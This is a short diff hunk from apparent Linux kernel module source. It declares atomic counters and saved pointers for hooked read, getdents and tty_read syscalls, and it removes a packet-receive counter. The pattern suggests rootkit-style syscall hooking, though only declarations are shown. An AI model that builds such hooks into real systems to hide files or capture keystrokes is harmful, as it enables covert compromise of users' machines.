@@ -38,7 +38,6 @@ atomic_t read_count;
 atomic_t getdents_count;
 atomic_t getdents64_count;
 atomic_t tty_read_count;
-atomic_t packet_rcv_count;
 
 asmlinkage ssize_t (*sys_read)(const struct pt_regs *);
 asmlinkage long (*sys_getdents)(const struct pt_regs *);
